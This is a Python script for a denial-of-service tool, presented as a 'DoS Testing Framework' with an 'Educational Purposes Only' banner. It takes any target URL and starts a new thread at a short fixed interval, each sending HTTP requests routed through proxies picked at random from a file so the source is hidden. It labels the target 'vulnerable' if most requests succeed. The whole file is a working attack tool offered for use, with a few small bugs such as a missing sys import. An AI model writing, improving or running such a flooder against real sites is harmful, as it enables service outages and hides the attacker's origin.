import requests
import threading
import time
import os
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
from rich.align import Align
import signal
import random

console = Console()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """[bold red]

  █████╗ ██╗  ██╗██╗██╗   ██╗ █████╗ ███████╗ ██╗██████╗ ██████╗ ███████╗
██╔════╝ ██║  ██║██║╚██╗ ██╔╝██╔══██╗██╔════╝███║╚════██╗╚════██╗╚════██║
██║  ███╗███████║██║ ╚████╔╝ ███████║███████╗╚██║ █████╔╝ █████╔╝    ██╔╝
██║   ██║██╔══██║██║  ╚██╔╝  ██╔══██║╚════██║ ██║ ╚═══██╗ ╚═══██╗   ██╔╝ 
╚██████╔╝██║  ██║██║   ██║   ██║  ██║███████║ ██║██████╔╝██████╔╝   ██║  
 ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝ ╚═╝╚═════╝ ╚═════╝    ╚═╝  
                                                                         

      [bright_yellow]╔══════════════════════════════╗[/]
      [bright_yellow]║[/]    [bold cyan]DoS Testing Framework[/]     [bright_yellow]║[/]
      [bright_yellow]║[/]   [bold red]Created by Ghiyas1337[/]     [bright_yellow]║[/]
      [bright_yellow]╚══════════════════════════════╝[/]
      [bright_yellow][[/][bold red]WARNING[/][bright_yellow]][/] [bold white]Educational Purposes Only[/]
      [bright_yellow][[/][bold cyan]INFO[/][bright_yellow]][/] [bold white]Press Ctrl+C to Stop Attack[/]
      [bright_yellow][[/][bold green]MODE[/][bright_yellow]][/] [bold white]Unlimited Threads | Auto-Timer[/]

⠀⠀⠀⠀⠀⠀[/]"""
    console.print(Align.center(banner))

def load_proxies(file_path):
    proxies = []
    with open(file_path, 'r') as file:
        for line in file:
            proxies.append(line.strip())  # Read IP:Port format
    return proxies

def select_random_proxy(proxies):
    return random.choice(proxies) if proxies else None

class Stats:
    def __init__(self):
        self.active = True
        self.total_requests = 0
        self.successful_requests = 0
        self.timeouts = 0
        self.failed_connections = 0
        self.other_errors = 0
        self.total_time = 0

def send_request(url, thread_id, stats, progress, proxies=None):
    if not stats.active:
        return
        
    try:
        start_time = time.time()
        response = requests.get(url, timeout=1, proxies=proxies)
        end_time = time.time()
        response_time = end_time - start_time
        
        stats.total_requests += 1
        if response.status_code == 200:
            stats.successful_requests += 1
        
        stats.total_time += response_time
        status_panel = Panel(
            f"[bold white]Response:[/] [cyan]{response.status_code}[/]\n[bold white]Time:[/] [blue]{response_time:.3f}s[/]",
            title=f"[bold green]Thread #{thread_id:03d}[/]",
            border_style="bright_yellow",
            padding=(0, 1)
        )
        progress.console.print(status_panel )
    except requests.exceptions.Timeout:
        stats.timeouts += 1
        error_panel = Panel(
            f"[bold red]Timeout occurred for Thread #{thread_id}[/]",
            title="[bold red]Error[/]",
            border_style="bright_yellow",
            padding=(1, 2)
        )
        progress.console.print(error_panel)
    except requests.exceptions.ConnectionError:
        stats.failed_connections += 1
        error_panel = Panel(
            f"[bold red]Connection error for Thread #{thread_id}[/]",
            title="[bold red]Error[/]",
            border_style="bright_yellow",
            padding=(1, 2)
        )
        progress.console.print(error_panel)
    except Exception as e:
        stats.other_errors += 1
        error_panel = Panel(
            f"[bold red]Error: {str(e)} for Thread #{thread_id}[/]",
            title="[bold red]Error[/]",
            border_style="bright_yellow",
            padding=(1, 2)
        )
        progress.console.print(error_panel)

def create_results_display(stats):
    return Panel(
        f"[bold white]Total Requests:[/] {stats.total_requests}\n"
        f"[bold white]Successful Requests:[/] {stats.successful_requests}\n"
        f"[bold white]Failed Connections:[/] {stats.failed_connections}\n"
        f"[bold white]Timeouts:[/] {stats.timeouts}\n"
        f"[bold white]Other Errors:[/] {stats.other_errors}",
        title="[bold green]Results Summary[/]",
        border_style="bright_yellow",
        padding=(1, 2)
    )

def signal_handler(sig, frame):
    console.print("\n[bold yellow]⚠ Signal received, stopping the attack...[/]")
    stats.active = False

def main():
    clear_screen()
    print_banner()
    
    url = console.input("\n[bright_yellow][[/][bold white]TARGET[/][bright_yellow]][/] [bold cyan]Enter URL:[/] ")
    delay = console.input("[bright_yellow][[/][bold white]SPEED[/][bright_yellow]][/] [bold cyan]Enter delay (0.1-1 sec, default: 0.1):[/] ")
    
    try:
        delay = float(delay)
        if not (0.1 <= delay <= 1):
            delay = 0.1
    except ValueError:
        delay = 0.1

    proxies = load_proxies('proxies.txt')
    
    clear_screen()
    print_banner()
    
    attack_config = f"""[bold white]Target[/] : {url}
[bold white]Mode[/]   : Unlimited Threads
[bold white]Speed[/]  : {delay}s delay
[bold white]Proxies[/] : Loaded from file"""

    console.print(Panel(
        attack_config,
        title="[bold red]Attack Configuration[/]",
        border_style="bright_yellow",
        padding=(1, 2)
    ))

    stats = Stats()
    signal.signal(signal.SIGINT, signal_handler)
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]Running attack...[/]"),
        BarColumn(pulse_style="red"),
        TimeRemainingColumn(),
        console=console
    ) as progress:
        try:
            thread_id = 1
            while stats.active:
                proxy = select_random_proxy(proxies)
                thread = threading.Thread(
                    target=send_request,
                    args=(url, thread_id, stats, progress, {"http": proxy, "https": proxy} if proxy else None)
                )
                thread.daemon = True
                thread.start()
                thread_id += 1
                time.sleep(delay)
                
        except KeyboardInterrupt:
            stats.active = False
            console.print("\n[bold yellow]⚠ Attack stopped by user[/]")
        finally:
            time.sleep(1)
            console.print("\n")
            console.print(create_results_display(stats))
            
            if stats.total_requests > 0:
                vulnerability = "Target appears to be [bold green]vulnerable[/]!" if stats.successful_requests / stats.total_requests > 0.8 \
                    else "Target appears to be [bold yellow]resistant[/] to the attack."
                console.print(Panel(
                    vulnerability,
                    title="[bold red]Analysis Result[/]",
                    border_style="bright_yellow",
                    padding=(1, 2)
                ))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"\n[bold red]Fatal Error: {str(e)}[/]")
        sys.exit(1)
